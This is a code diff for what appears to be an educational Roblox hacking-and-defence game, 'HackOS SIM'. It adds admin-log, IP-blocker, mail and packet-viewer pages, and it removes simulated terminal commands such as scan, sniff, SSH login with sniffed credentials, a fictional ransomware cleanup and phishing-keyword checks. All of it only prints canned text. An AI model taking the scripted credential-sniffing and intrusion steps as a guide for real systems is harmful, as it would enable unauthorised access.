+if entry.severity == "MEDIUM" then
+chipColor = Color3.fromRGB(208, 143, 38)
+cardColor = Color3.fromRGB(255, 249, 235)
+elseif entry.severity == "HIGH" then
+chipColor = Color3.fromRGB(212, 92, 49)
+cardColor = Color3.fromRGB(255, 243, 239)
+elseif entry.severity == "CRITICAL" then
+chipColor = Color3.fromRGB(184, 43, 43)
+cardColor = Color3.fromRGB(255, 236, 236)
+end
+local card = mk("Frame", {
+Parent = logsFrame,
+BackgroundColor3 = cardColor,
+BorderSizePixel = 0,
+Size = UDim2.new(1, -10, 0, 88),
+})
+round(card, 8)
+local chip = mk("TextLabel", {
+Parent = card,
+BackgroundColor3 = chipColor,
+BorderSizePixel = 0,
+Text = tostring(entry.severity),
+Font = Enum.Font.GothamBold,
+TextSize = 11,
+TextColor3 = Color3.new(1, 1, 1),
+Position = UDim2.new(0, 10, 0, 10),
+Size = UDim2.new(0, 76, 0, 20),
+})
+round(chip, 6)
+mk("TextLabel", {
+Parent = card,
+BackgroundTransparency = 1,
+Text = tostring(entry.stamp),
+Font = Enum.Font.Code,
+TextSize = 12,
+TextColor3 = Color3.fromRGB(70, 78, 92),
+TextXAlignment = Enum.TextXAlignment.Right,
+Position = UDim2.new(1, -88, 0, 12),
+Size = UDim2.new(0, 78, 0, 18),
+})
+mk("TextLabel", {
+Parent = card,
+BackgroundTransparency = 1,
+Text = tostring(entry.title),
+Font = Enum.Font.GothamBold,
+TextSize = 14,
+TextColor3 = Color3.fromRGB(25, 30, 38),
+TextXAlignment = Enum.TextXAlignment.Left,
+Position = UDim2.new(0, 10, 0, 36),
+Size = UDim2.new(1, -20, 0, 18),
+})
+mk("TextLabel", {
+Parent = card,
+BackgroundTransparency = 1,
+TextWrapped = true,
+TextYAlignment = Enum.TextYAlignment.Top,
+Text = tostring(entry.detail),
+Font = Enum.Font.Gotham,
+TextSize = 13,
+TextColor3 = Color3.fromRGB(70, 78, 92),
+TextXAlignment = Enum.TextXAlignment.Left,
+Position = UDim2.new(0, 10, 0, 56),
+Size = UDim2.new(1, -20, 0, 24),
+})
+end
+task.defer(function()
+logsFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
+end)
+end
+local function renderIPBlockerHistory()
+local ipBlockerPage = BrowserContent and BrowserContent:FindFirstChild("IPBlockerPage")
+local historyFrame = ipBlockerPage and ipBlockerPage:FindFirstChild("IPBlockerHistoryFrame")
+if not historyFrame or not historyFrame:IsA("ScrollingFrame") then return end
+for _, child in ipairs(historyFrame:GetChildren()) do
+if child:IsA("Frame") then
+child:Destroy()
+end
+end
+local layout = historyFrame:FindFirstChild("UIListLayout")
+if not layout then
+layout = mk("UIListLayout", {
+Parent = historyFrame,
+Name = "UIListLayout",
+Padding = UDim.new(0, 6),
+SortOrder = Enum.SortOrder.LayoutOrder,
+})
+end
+local blockedIPs = browserState.blockedIPs or {}
+if #blockedIPs == 0 then
+local empty = mk("Frame", {
+Parent = historyFrame,
+BackgroundColor3 = Color3.fromRGB(240, 243, 249),
+BorderSizePixel = 0,
+Size = UDim2.new(1, -10, 0, 48),
+})
+round(empty, 8)
+mk("TextLabel", {
+Parent = empty,
+BackgroundTransparency = 1,
+Text = "No blocked sources recorded yet.",
+Font = Enum.Font.Gotham,
+TextSize = 13,
+TextColor3 = Color3.fromRGB(70, 78, 92),
+TextXAlignment = Enum.TextXAlignment.Left,
+Position = UDim2.new(0, 10, 0, 14),
+Size = UDim2.new(1, -20, 0, 18),
+})
+else
+for _, ip in ipairs(blockedIPs) do
+local row = mk("Frame", {
+Parent = historyFrame,
+BackgroundColor3 = Color3.fromRGB(236, 245, 238),
+BorderSizePixel = 0,
+Size = UDim2.new(1, -10, 0, 54),
+})
+round(row, 8)
+mk("TextLabel", {
+Parent = row,
+BackgroundTransparency = 1,
+Text = ip,
+Font = Enum.Font.Code,
+TextSize = 13,
+TextColor3 = Color3.fromRGB(22, 86, 46),
+TextXAlignment = Enum.TextXAlignment.Left,
+Position = UDim2.new(0, 10, 0, 10),
+Size = UDim2.new(1, -20, 0, 16),
+})
+mk("TextLabel", {
+Parent = row,
+BackgroundTransparency = 1,
+Text = "Browser response rule active",
+Font = Enum.Font.Gotham,
+TextSize = 12,
+TextColor3 = Color3.fromRGB(49, 101, 68),
+TextXAlignment = Enum.TextXAlignment.Left,
+Position = UDim2.new(0, 10, 0, 28),
+Size = UDim2.new(1, -20, 0, 14),
+})
+end
+end
+task.defer(function()
+historyFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
+end)
 end
 local function showAdminDashboard(url)
 hideAllBrowserPages()
 if AdminDashboardPage then
 AdminDashboardPage.Visible = true
 end
-renderAdminResults(AdminSearchBox and AdminSearchBox.Text or "")
-setBrowserStatus(("Authenticated to %s (sim)"):format(url))
+local databaseTabBtn = AdminDashboardPage and AdminDashboardPage:FindFirstChild("AdminDatabaseTabBtn")
+local logsTabBtn = AdminDashboardPage and AdminDashboardPage:FindFirstChild("AdminLogsTabBtn")
+local logsFrame = AdminDashboardPage and AdminDashboardPage:FindFirstChild("AdminLogsFrame")
+local showLogs = browserState.adminTab == "logs"
+if AdminSearchBox then
+AdminSearchBox.Visible = not showLogs
 end
+if AdminResultsFrame then
+AdminResultsFrame.Visible = not showLogs
+end
+if logsFrame then
+logsFrame.Visible = showLogs
+end
+if databaseTabBtn and databaseTabBtn:IsA("TextButton") then
+databaseTabBtn.BackgroundColor3 = showLogs and Color3.fromRGB(100, 110, 132) or Color3.fromRGB(76, 123, 255)
+end
+if logsTabBtn and logsTabBtn:IsA("TextButton") then
+logsTabBtn.BackgroundColor3 = showLogs and Color3.fromRGB(76, 123, 255) or Color3.fromRGB(100, 110, 132)
+end
+if showLogs then
+renderAdminLogs()
+setBrowserStatus(("Authenticated to %s - security logs live"):format(url))
+else
+renderAdminResults(AdminSearchBox and AdminSearchBox.Text or "")
+setBrowserStatus(("Authenticated to %s (database view)"):format(url))
+end
+end
+local function showIPBlockerPage(url)
+hideAllBrowserPages()
+local ipBlockerPage = BrowserContent and BrowserContent:FindFirstChild("IPBlockerPage")
+if ipBlockerPage then
+ipBlockerPage.Visible = true
+end
+local inputBox = ipBlockerPage and ipBlockerPage:FindFirstChild("IPBlockerInputBox")
+if inputBox and inputBox:IsA("TextBox") then
+inputBox.Text = ""
+end
+local statusLabel = ipBlockerPage and ipBlockerPage:FindFirstChild("IPBlockerStatus")
+if statusLabel and statusLabel:IsA("TextLabel") then
+statusLabel.Text = "Enter a hostile source from the investigation feed."
+end
+renderIPBlockerHistory()
+setBrowserStatus(("Loaded %s response console (sim)"):format(url))
+end
+local function showMailPage(url)
+hideAllBrowserPages()
+local mailPage = BrowserContent and BrowserContent:FindFirstChild("MailPage")
+if mailPage then
+mailPage.Visible = true
+end
+if (browserState.selectedMailId == nil or browserState.selectedMailId == "") and type(CHAPTER3_MAILBOX[1]) == "table" then
+browserState.selectedMailId = tostring(CHAPTER3_MAILBOX[1].id or "")
+end
+if browserState._renderMailPage then
+browserState._renderMailPage()
+end
+setBrowserStatus(("Loaded %s staff inbox (sim)"):format(url))
+end
+
 local function packetMatchesFilter(pkt, dnsFilter)
 dnsFilter = tostring(dnsFilter or ""):lower()
 if dnsFilter == "" then
@@ -723,56 +1134,76 @@ Size = UDim2.new(1, -20, 0, 20),
 })
 end
 for _, pkt in ipairs(rows) do
+local rowColor = Color3.fromRGB(241, 246, 252)
+local accentColor = Color3.fromRGB(76, 123, 255)
+local chipText = Color3.new(1, 1, 1)
+if pkt.tone == "warning" then
+rowColor = Color3.fromRGB(255, 248, 234)
+accentColor = Color3.fromRGB(210, 143, 38)
+elseif pkt.tone == "danger" then
+rowColor = Color3.fromRGB(255, 238, 238)
+accentColor = Color3.fromRGB(186, 61, 61)
+end
 local row = mk("Frame", {
 Parent = PacketListFrame,
-BackgroundColor3 = Color3.fromRGB(244, 247, 252),
+BackgroundColor3 = rowColor,
 BorderSizePixel = 0,
-Size = UDim2.new(1, -10, 0, 96),
+Size = UDim2.new(1, -10, 0, 114),
 })
 round(row, 8)
+mk("Frame", {
+Parent = row,
+BackgroundColor3 = accentColor,
+BorderSizePixel = 0,
+Position = UDim2.new(0, 0, 0, 0),
+Size = UDim2.new(0, 6, 1, 0),
+})
 mk("TextLabel", {
 Parent = row,
 BackgroundTransparency = 1,
-Text = "IP: " .. pkt.ip .. " PROTOCOL: " .. pkt.protocol,
+Text = pkt.protocol .. "  " .. pkt.src .. "  ->  " .. pkt.dst,
 Font = Enum.Font.GothamBold,
 TextSize = 13,
 TextColor3 = Color3.fromRGB(20, 20, 28),
 TextXAlignment = Enum.TextXAlignment.Left,
-Position = UDim2.new(0, 10, 0, 6),
-Size = UDim2.new(1, -20, 0, 18),
+Position = UDim2.new(0, 14, 0, 8),
+Size = UDim2.new(1, -124, 0, 18),
 })
+local chip = mk("TextLabel", {
+Parent = row,
+BackgroundColor3 = accentColor,
+BorderSizePixel = 0,
+Text = pkt.tag,
+Font = Enum.Font.GothamBold,
+TextSize = 11,
+TextColor3 = chipText,
+Position = UDim2.new(1, -100, 0, 8),
+Size = UDim2.new(0, 88, 0, 20),
+})
+round(chip, 6)
 mk("TextLabel", {
 Parent = row,
 BackgroundTransparency = 1,
-Text = "SRC: " .. pkt.src .. " DST: " .. pkt.dst,
+Text = "DNS: " .. pkt.dns .. "    PORT: " .. pkt.port .. "    SERVER: " .. pkt.server,
 Font = Enum.Font.Code,
 TextSize = 12,
 TextColor3 = Color3.fromRGB(35, 45, 60),
 TextXAlignment = Enum.TextXAlignment.Left,
-Position = UDim2.new(0, 10, 0, 26),
-Size = UDim2.new(1, -20, 0, 16),
+Position = UDim2.new(0, 14, 0, 32),
+Size = UDim2.new(1, -28, 0, 16),
 })
 mk("TextLabel", {
 Parent = row,
 BackgroundTransparency = 1,
-Text = "DNS: " .. pkt.dns,
-Font = Enum.Font.Code,
-TextSize = 12,
-TextColor3 = Color3.fromRGB(35, 45, 60),
+TextWrapped = true,
+TextYAlignment = Enum.TextYAlignment.Top,
+Text = pkt.summary,
+Font = Enum.Font.Gotham,
+TextSize = 13,
+TextColor3 = Color3.fromRGB(58, 67, 80),
 TextXAlignment = Enum.TextXAlignment.Left,
-Position = UDim2.new(0, 10, 0, 44),
-Size = UDim2.new(1, -20, 0, 16),
-})
-mk("TextLabel", {
-Parent = row,
-BackgroundTransparency = 1,
-Text = "PORT: " .. pkt.port .. " SERVER: " .. pkt.server,
-Font = Enum.Font.Code,
-TextSize = 12,
-TextColor3 = Color3.fromRGB(35, 45, 60),
-TextXAlignment = Enum.TextXAlignment.Left,
-Position = UDim2.new(0, 10, 0, 62),
-Size = UDim2.new(1, -20, 0, 16),
+Position = UDim2.new(0, 14, 0, 56),
+Size = UDim2.new(1, -28, 0, 42),
 })
 end
 task.defer(function()
@@ -798,430 +1229,331 @@ showTextPage("", "")
 return
 end
 if uNorm == "bloxplay.com/admin" or uNorm == "www.bloxplay.com/admin" then
+local result = submitScenarioAction and submitScenarioAction("browser_visit bloxplay.com/admin", { "ch2_admin_portal" })
 if browserState.adminLoggedIn then
 showAdminDashboard(uNorm)
 else
 showAdminLoginPage(uNorm)
 end
+if result and result.success then
+setBrowserStatus("Admin portal reached. Mission step complete.")
+end
+return
+end
+if uNorm == "mail.bloxplay.com" or uNorm == "www.mail.bloxplay.com" then
+local result = submitScenarioAction and submitScenarioAction("browser_visit mail.bloxplay.com", { "ch3_mail_site" })
+showMailPage(uNorm)
+queueAutoSave(false)
+if result and result.success then
+setBrowserStatus("BloxMail opened. Mission step complete.")
+end
 return
 end
 if uNorm == "rbxpacketnet.com" or uNorm == "www.rbxpacketnet.com" then
+local result = submitScenarioAction and submitScenarioAction("browser_visit rbxpacketnet.com", { "ch1_packetnet" })
 showPacketPage(uNorm)
+queueAutoSave(false)
+if result and result.success then
+setBrowserStatus("RBXPacketNet opened. Mission step complete.")
+end
+return
+end
+if uNorm == "rbxipblocker.com" or uNorm == "www.rbxipblocker.com" then
+local result = submitScenarioAction and submitScenarioAction("browser_visit rbxipblocker.com", { "ch4_visit_blocker" })
+showIPBlockerPage(uNorm)
+queueAutoSave(false)
+if result and result.success then
+setBrowserStatus("RBXIPBlocker opened. Mission step complete.")
+end
 return
 end
 showTextPage(PAGES[uNorm] or ('No renderer for "%s" (sim).'):format(url), "Page loaded (sim)")
+queueAutoSave(false)
 end
-local function getHostKey()
-if terminalState.currentHost == "PlayerData_Vault" then
-return "playerdata_vault"
+local function copyStringArray(values)
+local copy = {}
+if type(values) ~= "table" then
+return copy
 end
-return terminalState.currentHost == "local" and "localhost" or "localhost"
+for _, value in ipairs(values) do
+if type(value) == "string" and value ~= "" then
+copy[#copy + 1] = value
 end
-local function getFS()
-local host = getHostKey()
-return SimFSByHost[host] or SimFSByHost.localhost
 end
-local function getContents()
-local host = getHostKey()
-return SimFileContentsByHost[host] or SimFileContentsByHost.localhost
+return copy
 end
-local function getProcesses()
-local host = getHostKey()
-return SimProcessesByHost[host] or SimProcessesByHost.localhost
+local function getVisiblePanel()
+if browserState.visiblePanel == "browser" or browserState.visiblePanel == "missions" or browserState.visiblePanel == "terminal" then
+return browserState.visiblePanel
 end
-local function pathLeaf(path)
-local s = tostring(path or ""):gsub("^%s+", ""):gsub("%s+$", "")
-s = s:gsub("^/+", "")
-local parts = {}
-for part in s:gmatch("[^/]+") do
-parts[#parts + 1] = part
+if BrowserFrame and BrowserFrame.Visible then
+return "browser"
 end
-return parts[#parts] or s
+if MissionsFrame and MissionsFrame.Visible then
+return "missions"
 end
-local function listPath(path)
-local p = tostring(path or "")
-if p == "" then p = terminalState.currentDir end
-local fs = getFS()
-local list = fs[p]
-if not list then
-addLine(("ls: cannot access '%s': No such file or directory (sim)"):format(p))
+return "terminal"
+end
+local function applyVisiblePanelLayout(panel)
+if not (TermFrame and BrowserFrame and MissionsFrame) then
 return
 end
-addLine(("Listing %s on %s (sim)"):format(p, terminalState.currentHost))
-for _, name in ipairs(list) do
-addLine(" " .. name)
-end
-end
-local function catFile(path)
-local name = pathLeaf(path)
-local contents = getContents()
-local content = contents[name]
-if not content then
-addLine(("cat: %s: No such file (sim)"):format(tostring(path)))
-return
-end
-addLine(("--- %s ---"):format(name))
-for line in tostring(content):gmatch("[^\n]+") do
-addLine(line)
-end
-end
-local function openFile(path)
-local name = pathLeaf(path)
-local contents = getContents()
-if not contents[name] then
-addLine(("openfile: %s not found (sim)"):format(tostring(path)))
-return
-end
-OpenFiles[name] = true
-addLine(("Opened %s (sim)"):format(name))
-end
-local function closeFile(path)
-local name = pathLeaf(path)
-if OpenFiles[name] then
-OpenFiles[name] = nil
-addLine(("Closed %s (sim)"):format(name))
+local inset = 6
+if panel == "terminal" then
+TermFrame.Position = UDim2.new(0, inset, 0, inset)
+TermFrame.Size = UDim2.new(1, -(inset * 2), 1, -(inset * 2))
+BrowserFrame.Position = UDim2.new(0, inset, 0, inset)
+BrowserFrame.Size = UDim2.new(1, -(inset * 2), 1, -(inset * 2))
+elseif panel == "browser" then
+BrowserFrame.Position = UDim2.new(0, inset, 0, inset)
+BrowserFrame.Size = UDim2.new(1, -(inset * 2), 1, -(inset * 2))
+TermFrame.Position = UDim2.new(0, inset, 0, inset)
+TermFrame.Size = UDim2.new(1, -(inset * 2), 1, -(inset * 2))
 else
-addLine(("closefile: %s is not open (sim)"):format(name))
+MissionsFrame.Position = UDim2.new(0, inset, 0, inset)
+MissionsFrame.Size = UDim2.new(1, -(inset * 2), 1, -(inset * 2))
 end
 end
-local function removeFile(path)
-local name = pathLeaf(path)
-local contents = getContents()
-local fs = getFS()
-if contents[name] then
-contents[name] = nil
-OpenFiles[name] = nil
-for _, items in pairs(fs) do
-for i = #items, 1, -1 do
-if items[i] == name then
-table.remove(items, i)
+
+local function setVisiblePanel(panel, options)
+options = options or {}
+panel = panel == "browser" and "browser" or panel == "missions" and "missions" or "terminal"
+browserState.visiblePanel = panel
+if not (TermFrame and BrowserFrame and MissionsFrame) then
+return panel
 end
+applyVisiblePanelLayout(panel)
+TermFrame.Visible = panel == "terminal"
+BrowserFrame.Visible = panel == "browser"
+MissionsFrame.Visible = panel == "missions"
+if panel == "terminal" then
+if options.captureFocus ~= false and TermInput and TermInput.Parent then
+task.defer(function()
+if TermInput and TermInput.Parent and TermFrame and TermFrame.Visible and MainGUI and MainGUI.Enabled then
+TermInput:CaptureFocus()
 end
+end)
 end
-addLine(("Removed %s (sim)"):format(name))
+return panel
+end
+if panel == "browser" then
+local urlToOpen = options.url
+if urlToOpen == nil then
+if UrlBox and UrlBox.Text ~= "" then
+urlToOpen = UrlBox.Text
 else
-addLine(("rm: cannot remove '%s': No such file (sim)"):format(tostring(path)))
+local savedUrl = tostring(browserState.currentUrl or "about:blank")
+urlToOpen = savedUrl ~= "about:blank" and savedUrl or "home"
+if UrlBox then
+UrlBox.Text = urlToOpen
 end
 end
-local function showScan(target)
-target = target ~= "" and target:lower() or "nearby"
-addLine(("Scan target: %s (sim)"):format(target))
-if target == "nearby" then
-for _, info in ipairs(getAllHostsList()) do
-addLine(("%s [%s] open:%s role:%s"):format(
-info.label,
-info.ip,
-table.concat(info.ports, ", "),
-info.role
-))
+elseif UrlBox then
+UrlBox.Text = urlToOpen == "about:blank" and "" or urlToOpen
 end
-addLine("Hint: inspect the employee workstation or a sensitive internal host next (sim)")
-terminalState.scanCache = "192.168.32.12"
-return
+if options.navigate ~= false then
+navigateTo(urlToOpen)
 end
-local host = getHostByIP(target)
-if not host then
-addLine("No host found in scan range (sim).")
-return
+if options.captureFocus ~= false and UrlBox then
+task.defer(function()
+if UrlBox and UrlBox.Parent and BrowserFrame and BrowserFrame.Visible and MainGUI and MainGUI.Enabled then
+pcall(function() UrlBox:CaptureFocus() end)
 end
-addLine(("Host: %s"):format(host.label))
-addLine(("IP: %s"):format(host.ip))
-addLine(("Ports: %s"):format(table.concat(host.ports, ", ")))
-addLine(("Service Family: %s"):format(host.server))
-addLine(("Role: %s"):format(host.role))
+end)
 end
-local function showSniff(target)
-target = target ~= "" and target or "192.168.32.12"
-local host = getHostByIP(target)
-if not host then
-addLine("sniff: unknown target ip (sim)")
-return
 end
-startPacketCaptureForIP(target)
-addLine(("Sniffing %s (%s) ... (sim)"):format(host.label, host.ip))
-for i = 1, math.min(5, #ActivePacketCapture.rows) do
-local r = ActivePacketCapture.rows[i]
-addLine(("[%d] %s %s -> %s dns=%s port=%s server=%s"):format(
-i, r.protocol, r.src, r.dst, r.dns, r.port, r.server
-))
+return panel
 end
-addLine("Capture complete: targeted packets generated (sim)")
-terminalState.sniffCache = {
-host = host.label,
-ip = host.ip,
-server = "PlayerData_Vault",
-attackerIP = terminalState.lastAttackerIP,
+local function captureSessionRestoreState()
+return {
+progress = captureProgressState and captureProgressState() or nil,
+started = started == true,
+commandHistory = copyStringArray(commandHistory),
+currentDraft = tostring(currentDraft or ""),
 }
 end
-local function showPackets(target)
-target = target ~= "" and target or (terminalState.sniffCache and terminalState.sniffCache.ip or "192.168.32.12")
-local host = getHostByIP(target)
-if not host then
-addLine("packets: unknown target ip (sim)")
-return
+local function applySessionRestoreState(state)
+if type(state) ~= "table" then
+return false
 end
-startPacketCaptureForIP(target)
-addLine(("Packet Analyzer: %s (%s) (sim)"):format(host.label, host.ip))
-addLine(("Generated rows: %d"):format(#ActivePacketCapture.rows))
-addLine("Browser view: visit RBXPacketNet.com")
+local restored = false
+if type(state.progress) == "table" and applyProgressState then
+restored = applyProgressState(state.progress)
 end
-local function fakeConnect(target)
-target = target ~= "" and target or "192.168.43.20"
-local host = getHostByIP(target)
-if not host then
-addLine(("connect: cannot resolve %s (sim)"):format(target))
-return
+commandHistory = copyStringArray(state.commandHistory)
+historyIndex = nil
+currentDraft = type(state.currentDraft) == "string" and state.currentDraft or ""
+if TermInput and TermInput.Parent then
+TermInput.Text = currentDraft
 end
-addLine(("Resolving %s ... (sim)"):format(target))
-addLine(("Connected to %s [%s] (sim)"):format(host.label, host.ip))
-terminalState.connectedHost = host.label
+if state.started == true then
+started = true
 end
-local function fakeSSH(dest)
-dest = tostring(dest or "")
-if dest == "" then
-addLine("Try: ssh bloxplay-admin@192.168.43.20")
-return
+return restored or state.started == true or #commandHistory > 0 or currentDraft ~= ""
 end
-local user, hostInput = dest:match("^([^@]+)@(.+)$")
-if not user or not hostInput then
-addLine("ssh: invalid destination. Try user@host")
-return
-end
-local host = getHostByIP(hostInput)
-if not host or host.label ~= "PlayerData_Vault" then
-addLine(("ssh: %s not available in simulation"):format(hostInput))
-return
-end
-addLine(("ssh: connecting to %s ... (sim)"):format(dest))
-if terminalState.sniffCache then
-addLine("Using credentials previously observed in traffic capture (sim)")
-end
-addLine("Host key fingerprint verified (sim)")
-addLine("Password accepted (sim)")
-addLine(("Welcome %s, connected to %s"):format(user, host.label))
-terminalState.currentHost = host.label
-terminalState.currentDir = "/"
-terminalState.sshSession = true
-end
-local function fakeExit()
-if terminalState.sshSession then
-addLine(("Connection to %s closed."):format(terminalState.currentHost))
-terminalState.currentHost = "local"
-terminalState.currentDir = "/"
-terminalState.sshSession = false
-else
-addLine("No remote session active.")
+captureProgressState = function()
+local openFiles = {}
+for pathName, isOpen in pairs(OpenFiles) do
+if isOpen then
+openFiles[#openFiles + 1] = tostring(pathName)
 end
 end
-local function fakeNetstat()
-addLine(("Active connections on %s (sim)"):format(terminalState.currentHost))
-if terminalState.currentHost == "PlayerData_Vault" then
-addLine("tcp 0 0 192.168.43.20:22 192.168.32.12:49822 ESTABLISHED")
-addLine("tcp 0 0 192.168.43.20:443 203.44.18.77:8080 ESTABLISHED")
-addLine("tcp 0 0 192.168.43.20:3306 192.168.43.25:54011 TIME_WAIT")
-addLine("Finding: suspicious outbound connection to 203.44.18.77")
-else
-addLine("tcp 0 0 192.168.32.12:49210 192.168.43.20:443 ESTABLISHED")
-addLine("udp 0 0 192.168.32.10:5353 224.0.0.251:5353 LISTEN")
+table.sort(openFiles)
+local sniffCache = nil
+if type(terminalState.sniffCache) == "table" then
+sniffCache = {
+host = terminalState.sniffCache.host,
+ip = terminalState.sniffCache.ip,
+server = terminalState.sniffCache.server,
+attackerIP = terminalState.sniffCache.attackerIP,
+}
 end
+local blockedIPs = {}
+for _, ip in ipairs(browserState.blockedIPs or {}) do
+blockedIPs[#blockedIPs + 1] = tostring(ip)
 end
-local function fakePsrep()
-addLine(("PID NAME STATUS HOST=%s"):format(terminalState.currentHost))
-for _, p in ipairs(getProcesses()) do
-addLine(("%-5d %-19s %s"):format(p.pid, p.name, p.status))
+table.sort(blockedIPs)
+return {
+browserState = {
+adminLoggedIn = browserState.adminLoggedIn == true,
+currentUrl = tostring(browserState.currentUrl or "about:blank"),
+stickyNoteInspected = browserState.stickyNoteInspected == true,
+adminTab = browserState.adminTab == "logs" and "logs" or "database",
+blockedIPs = blockedIPs,
+selectedMailId = tostring(browserState.selectedMailId or ""),
+visiblePanel = getVisiblePanel(),
+},
+terminalState = {
+currentHost = tostring(terminalState.currentHost or "local"),
+currentDir = tostring(terminalState.currentDir or "/"),
+connectedHost = terminalState.connectedHost,
+sshSession = terminalState.sshSession == true,
+scanCache = terminalState.scanCache,
+sniffCache = sniffCache,
+lastAttackerIP = tostring(terminalState.lastAttackerIP or "203.44.18.77"),
+},
+packetCapture = {
+targetIP = tostring(ActivePacketCapture.targetIP or ""),
+targetLabel = tostring(ActivePacketCapture.targetLabel or ""),
+},
+openFiles = openFiles,
+}
 end
-if terminalState.currentHost == "PlayerData_Vault" then
-addLine("Finding: PID 1337 looks like WannaWail activity (fictional sim)")
+applyProgressState = function(state)
+if type(state) ~= "table" then
+return false
 end
+local previousBrowserState = browserState
+local browser = type(state.browserState) == "table" and state.browserState or {}
+local terminal = type(state.terminalState) == "table" and state.terminalState or {}
+local packetCapture = type(state.packetCapture) == "table" and state.packetCapture or {}
+local sniffCache = nil
+if type(terminal.sniffCache) == "table" then
+sniffCache = {
+host = terminal.sniffCache.host,
+ip = terminal.sniffCache.ip,
+server = terminal.sniffCache.server,
+attackerIP = terminal.sniffCache.attackerIP,
+}
 end
-local function fakeKill(pidText)
-local pid = tonumber(pidText)
-if not pid then
-addLine("Try: kill <pid>")
-return
-end
-local processes = getProcesses()
-for i, p in ipairs(processes) do
-if p.pid == pid then
-addLine(("Terminated PID %d (%s) (sim)"):format(pid, p.name))
-table.remove(processes, i)
-return
-end
-end
-addLine(("kill: %d: no such process (sim)"):format(pid))
-end
-local function fakePasswd(pw)
-local s = tostring(pw or "")
-if s == "" then
-addLine("Try: passwd NewStrongPass123!")
-return
-end
-local score = 0
-if #s >= 12 then score = score + 2 elseif #s >= 8 then score = score + 1 end
-if s:match("%d") then score = score + 1 end
-if s:match("%l") and s:match("%u") then score = score + 1 end
-if s:match("[%p%W_]") then score = score + 1 end
-if score <= 1 then
-addLine("passwd (sim): weak password rejected")
-elseif score <= 3 then
-addLine("passwd (sim): acceptable, but could be stronger")
-else
-addLine("passwd (sim): password updated successfully")
-end
-end
-local function fakeGrep(pattern, file)
-pattern = tostring(pattern or "")
-file = tostring(file or "")
-if pattern == "" or file == "" then
-addLine('Try: grep "Failed login" auth.log')
-return
-end
-local contents = getContents()
-local text = contents[pathLeaf(file)]
-if not text then
-addLine(("grep: %s: No such file (sim)"):format(file))
-return
-end
-local found = false
-for line in tostring(text):gmatch("[^\n]+") do
-if line:lower():find(pattern:lower(), 1, true) then
-addLine(line)
-found = true
-end
-end
-if not found then
-addLine("No matches found (sim)")
-end
-end
-local function fakeMalwareScan()
-addLine(("Malware scanner on %s (sim)"):format(terminalState.currentHost))
-if terminalState.currentHost == "PlayerData_Vault" then
-addLine("Alert: sync_jobs.sh flagged as WannaWail (fictional ransomware-style sample)")
-addLine("IOC: outbound endpoint 203.44.18.77")
-addLine("Recommended actions: kill 1337, rm sync_jobs.sh, passwd <new>")
-else
-addLine("No malware indicators found on local tablet (sim)")
-end
-end
-local function showDevices()
-addLine("Known devices (SIM):")
-for _, host in ipairs(getAllHostsList()) do
-addLine(("%s ip=%s mac=%s role=%s service=%s"):format(
-host.label, host.ip, host.mac, host.role, host.server
-))
-end
-end
-local function showMac(target)
-target = tostring(target or "")
-if target == "" then
-addLine("Try: mac <ip>")
-return
-end
-local host = getHostByIP(target)
-if not host then
-addLine("mac: unknown ip (sim)")
-return
-end
-addLine(("%s ip=%s mac=%s"):format(host.label, host.ip, host.mac))
-end
-local function phishCheck(text)
-local t = (text or ""):lower()
-local flags = 0
-local clues = {}
-local function flag(clue)
-flags = flags + 1
-table.insert(clues, "- " .. clue)
-end
-if t:find("urgent") or t:find("immediately") then flag("It tries to rush you.") end
-if t:find("password") or t:find("verify") then flag("It asks for credentials or account verification.") end
-if t:find("free") or t:find("winner") or t:find("prize") then flag("It offers a too-good-to-be-true reward.") end
-if t:find("gift card") then flag("Gift card request is a common scam sign.") end
-if t:find("click") and (t:find("link") or t:find("http")) then flag("It pushes you to click a link.") end
-if flags == 0 then
-addLine("baitcheck (sim): message looks calmer, but still verify the sender.")
-else
-addLine(("baitcheck (sim): %d suspicious clue(s) found:"):format(flags))
-for _, c in ipairs(clues) do
-addLine(c)
+local blockedIPs = {}
+if type(browser.blockedIPs) == "table" then
+for _, ip in ipairs(browser.blockedIPs) do
+if type(ip) == "string" and ip ~= "" then
+blockedIPs[#blockedIPs + 1] = ip
 end
 end
 end
-local function decoyMail(text)
-local t = (text or ""):lower()
-addLine("decoymail (sim): message tone analysis")
-if t == "" then
-addLine('Try: decoymail "URGENT verify your account now"')
-return
-end
-if t:find("urgent") or t:find("verify") or t:find("reset") then
-addLine("- Pressure language detected")
-addLine("- Credential harvest risk elevated")
-else
-addLine("- No strong pressure wording detected")
-end
-if t:find("admin") or t:find("security") then
-addLine("- Impersonation of authority possible")
-end
-end
-local function fakeCrackNG(target)
-target = tostring(target or "")
-if target == "" then
-addLine("Try: crack-ng 192.168.32.10")
-return
-end
-addLine(("crack-ng audit target=%s (sim only)"):format(target))
-if target == "192.168.32.10" or target == "192.168.43.2" then
-addLine("- weak segmentation policy found")
-addLine("- offline audit result: admin traffic overlaps with user network patterns")
-addLine("- recommendation: rotate credentials and separate wireless domains")
-else
-addLine("- no weak password policy found in simulation")
+browserState = {
+adminLoggedIn = browser.adminLoggedIn == true,
+currentUrl = type(browser.currentUrl) == "string" and browser.currentUrl or "about:blank",
+stickyNoteInspected = browser.stickyNoteInspected == true,
+adminTab = browser.adminTab == "logs" and "logs" or "database",
+blockedIPs = blockedIPs,
+selectedMailId = type(browser.selectedMailId) == "string" and browser.selectedMailId or (type(CHAPTER3_MAILBOX[1]) == "table" and tostring(CHAPTER3_MAILBOX[1].id or "") or ""),
+logStreamStartedAt = 0,
+logsLastRender = 0,
+lastInteractionAt = os.clock(),
+idleAutoSaveNotified = false,
+visiblePanel = browser.visiblePanel == "browser" and "browser" or browser.visiblePanel == "missions" and "missions" or "terminal",
+}
+for key, value in pairs(previousBrowserState or {}) do
+if type(key) == "string" and key:sub(1, 1) == "_" then
+browserState[key] = value
 end
 end
-local function showHelp()
-addLine("HackOS SIM commands:")
-addLine("help - show this list")
-addLine("hint - show a clue for the current objective")
-addLine("apps - list apps")
-addLine("open <terminal|browser|notes> - switch screens")
-addLine("visit <url|home|tips|apps> - open a page (sim)")
-addLine("scan [nearby|ip] - scan nearby devices/host (sim)")
-addLine("sniff [ip] - capture fake packet traffic (sim)")
-addLine("packets [ip] - packet analyzer summary (sim)")
-addLine("devices - list devices + MACs (terminal only)")
-addLine("mac <ip> - show MAC for device")
-addLine("connect <ip> - simulate network access (sim)")
-addLine("ssh <user@ip> - simulate SSH login")
-addLine("exit - leave simulated SSH session")
-addLine("netstat - show fake network sessions")
